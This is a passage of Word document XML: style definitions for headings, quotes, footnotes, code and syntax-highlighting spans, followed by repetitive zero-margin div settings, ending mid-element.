    <w:qFormat/>
    <w:rsid w:val="00404615"/>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404615"/>
    <w:rPr>
      <w:color w:val="5A5A5A" w:themeColor="text1" w:themeTint="A5"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="004D7B3D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00404615"/>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40461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04615"/>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sid w:val="00404615"/>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sid w:val="0040461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461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4615"/>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404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:caps/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:before="160"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="0040461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04615"/>
    <w:rPr>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2" w:themeFill="background1" w:themeFillShade="F2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rsid w:val="0040461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04615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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rsid w:val="00404615"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:link w:val="NoSpacingChar"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="003C7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27573"/>
    <w:rPr>
      <w:color w:val="6B9F25" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="PlainTable11">
    <w:name w:val="Plain Table 11"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="41"/>
    <w:rsid w:val="006B38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rsid w:val="00046389"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="code">
    <w:name w:val="code"/>
    <w:basedOn w:val="NoSpacing"/>
    <w:link w:val="codeChar"/>
    <w:qFormat/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="codeChar">
    <w:name w:val="code Char"/>
    <w:basedOn w:val="NoSpacingChar"/>
    <w:link w:val="code"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E7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33D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E7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733D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BE6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6B72"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Abtracttitle">
    <w:name w:val="Abtracttitle"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="AbtracttitleChar"/>
    <w:qFormat/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="left" w:pos="2390"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="AbtracttitleChar">
    <w:name w:val="Abtracttitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Abtracttitle"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="TableGrid0">
    <w:name w:val="TableGrid"/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:top w:w="0" w:type="dxa"/>
        <w:left w:w="0" w:type="dxa"/>
        <w:bottom w:w="0" w:type="dxa"/>
        <w:right w:w="0" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Revision">
    <w:name w:val="Revision"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00BA7AE1"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00154C09"/>
    <w:rPr>
      <w:color w:val="B26B02" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001F4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1F43BC"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008F60ED"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008F60ED"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="008F60ED"/>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8F60ED"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="008F60ED"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention1">
    <w:name w:val="Unresolved Mention1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DD789C"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="p">
    <w:name w:val="p"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="nt">
    <w:name w:val="nt"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="na">
    <w:name w:val="na"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="o">
    <w:name w:val="o"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="s">
    <w:name w:val="s"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="nx">
    <w:name w:val="nx"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="s1">
    <w:name w:val="s1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00240031"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-ta">
    <w:name w:val="crayon-ta"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-r">
    <w:name w:val="crayon-r"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-sy">
    <w:name w:val="crayon-sy"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-t">
    <w:name w:val="crayon-t"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-h">
    <w:name w:val="crayon-h"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-v">
    <w:name w:val="crayon-v"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-e">
    <w:name w:val="crayon-e"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-o">
    <w:name w:val="crayon-o"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-s">
    <w:name w:val="crayon-s"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="crayon-cn">
    <w:name w:val="crayon-cn"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000547A2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Bibliography">
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="37"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00510F46"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="comment">
    <w:name w:val="comment"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="005509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96614">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="52196943">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="60955098">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="62801218">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="77413619">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="123617809">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="160244928">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="195892471">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="224991849">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="234904048">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="240410659">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="261649569">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="291984835">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="294914013">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="333844388">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="360786431">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="373359370">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="378945412">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
